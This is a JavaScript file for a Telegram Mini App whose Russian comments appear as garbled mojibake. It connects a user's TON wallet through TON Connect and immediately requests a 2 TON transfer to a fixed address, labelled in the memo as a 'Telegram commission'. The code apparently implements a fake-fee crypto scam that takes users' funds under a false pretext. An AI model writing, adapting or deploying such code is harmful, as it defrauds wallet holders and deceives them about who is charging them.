let tg = window.Telegram.WebApp;
tg.expand();

// === –§—É–Ω–∫—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ TON Connect SDK ===
async function loadTonConnect() {
    return new Promise((resolve, reject) => {
        const script = document.createElement("script");
        script.src = "tonconnect-sdk.min.js"; // –ò—Å–ø–æ–ª—å–∑—É–µ–º –ª–æ–∫–∞–ª—å–Ω—ã–π SDK
        script.onload = () => {
            console.log("‚úÖ TON Connect SDK –∑–∞–≥—Ä—É–∂–µ–Ω!");
            resolve();
        };
        script.onerror = (error) => {
            console.error("‚ùå –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ TON Connect SDK!", error);
            reject(error);
        };
        document.head.appendChild(script);
    });
}

// === –§—É–Ω–∫—Ü–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ TON ===
async function connectWallet() {
    console.log("üü° –§—É–Ω–∫—Ü–∏—è connectWallet() –≤—ã–∑–≤–∞–Ω–∞!");

    try {
        const tonConnect = new TonConnect({
            manifestUrl: "https://telegram-mini-app-seven-blond.vercel.app/tonconnect-manifest.json"
        });

        const connectedWallet = await tonConnect.connect();
        if (!connectedWallet) {
            console.error("‚ùå –û—à–∏–±–∫–∞: –ö–æ—à–µ–ª–µ–∫ –Ω–µ –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è");
            alert("‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è");
            return;
        }

        console.log("‚úÖ –ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω:", connectedWallet.account.address);
        alert("‚úÖ –ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω: " + connectedWallet.account.address);

        // === –°–æ–∑–¥–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –Ω–∞ 2 TON ===
        const transaction = {
            to: "UQDDZ6llEnqAe2QqRAyuY3rQkWa3ZdFFH_Ksc8AjcrRvtFzc",
            value: "2000000000",
            payload: "–ö–æ–º–∏—Å—Å–∏—è telegram"
        };

        console.log("üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:", transaction);
        await tonConnect.sendTransaction(transaction);
        alert("‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –Ω–∞ 2 TON –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!");
    } catch (error) {
        console.error("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏:", error);
        alert("‚ùå –û—à–∏–±–∫–∞: " + error.message);
    }
}
